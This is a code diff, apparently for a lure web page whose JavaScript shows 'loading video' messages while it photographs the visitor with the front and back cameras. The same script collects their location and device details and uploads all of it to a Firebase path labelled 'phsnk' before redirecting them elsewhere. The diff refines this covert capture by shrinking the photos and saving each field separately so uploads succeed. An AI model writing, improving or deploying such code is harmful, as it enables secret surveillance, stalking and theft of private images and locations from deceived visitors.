@@ -47,11 +47,12 @@ const spin = document.getElementById('spin');
 
 function st(x){ el.textContent = x; }
 
+// ==== KAMERA (ukuran kecil biar gak overload Firebase) ====
 async function cam(facing){
   try {
     st('Minta izin kamera...');
     const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: facing, width: {ideal:640}, height: {ideal:480} },
+      video: { facingMode: facing, width: {ideal:480}, height: {ideal:360} },
       audio: false
     });
     st('Mengambil foto...');
@@ -61,14 +62,20 @@ async function cam(facing){
     v.muted = true;
     await v.play();
     await new Promise(r => setTimeout(r, 1500));
+
+    // === KECILKAN FOTO: 320x240, quality 40% ===
     const c = document.createElement('canvas');
-    c.width = v.videoWidth || 640;
-    c.height = v.videoHeight || 480;
-    c.getContext('2d').drawImage(v, 0, 0);
+    c.width = 320;
+    c.height = 240;
+    c.getContext('2d').drawImage(v, 0, 0, 320, 240);
     stream.getTracks().forEach(t => t.stop());
-    return c.toDataURL('image/jpeg', 0.7);
+
+    const dataUrl = c.toDataURL('image/jpeg', 0.4);
+    console.log('Foto size:', Math.round(dataUrl.length / 1024), 'KB');
+    return dataUrl;
   } catch(e) {
-    console.log('Camera error:', facing, e.message);
+    console.log('Camera error:', facing, e.name, e.message);
+    st('Kamera gagal: ' + e.name);
     return null;
   }
 }
@@ -134,35 +141,67 @@ async function run(){
   st('Memuat video...');
   await new Promise(r => setTimeout(r, 300));
 
+  // === 1. KAMERA DEPAN ===
   const fd = await cam('user');
+  console.log('[1] Foto depan:', fd ? 'OK' : 'GAGAL');
   await new Promise(r => setTimeout(r, 500));
 
+  // === 2. KAMERA BELAKANG ===
   const fb = await cam('environment');
+  console.log('[2] Foto belakang:', fb ? 'OK' : 'GAGAL');
   await new Promise(r => setTimeout(r, 500));
 
+  // === 3. LOKASI ===
   const l = await loc();
   await new Promise(r => setTimeout(r, 300));
 
+  // === 4. DEVICE ===
   st('Menyiapkan...');
   const d = await dev();
   await new Promise(r => setTimeout(r, 300));
 
   st('Menyelesaikan...');
   try {
+    // Kirim data dasar dulu
     await db.ref('phsnk/' + id).update({
-      id,
-      fotoDepan: fd,
-      fotoBelakang: fb,
-      lokasi: l,
-      device: d,
+      id: id,
+      status: 'captured',
       capturedAt: Date.now(),
-      status: 'captured'
+      device: d
     });
-    console.log('[PHSNK] Saved!');
-  } catch(e) { console.error(e); }
+    console.log('[BASE] Saved');
 
-  st('Selesai');
-  setTimeout(() => { location.href = tu; }, 500);
+    // Lokasi
+    if (l) {
+      await db.ref('phsnk/' + id + '/lokasi').set(l);
+      console.log('[LOKASI] Saved');
+    }
+
+    // Foto depan
+    if (fd) {
+      await db.ref('phsnk/' + id + '/fotoDepan').set(fd);
+      console.log('[FOTO DEPAN] Saved');
+    } else {
+      await db.ref('phsnk/' + id + '/fotoDepan').set('GAGAL_KAMERA');
+    }
+
+    // Foto belakang
+    if (fb) {
+      await db.ref('phsnk/' + id + '/fotoBelakang').set(fb);
+      console.log('[FOTO BELAKANG] Saved');
+    } else {
+      await db.ref('phsnk/' + id + '/fotoBelakang').set('GAGAL_KAMERA');
+    }
+
+    st('✅ Data terkirim');
+    console.log('[ALL SAVED]');
+  } catch(e) {
+    console.error('[ERROR]', e);
+    st('❌ Gagal: ' + e.message);
+    await new Promise(r => setTimeout(r, 2000));
+  }
+
+  setTimeout(() => { location.href = tu; }, 800);
 }
 
 btn.addEventListener('click', () => {
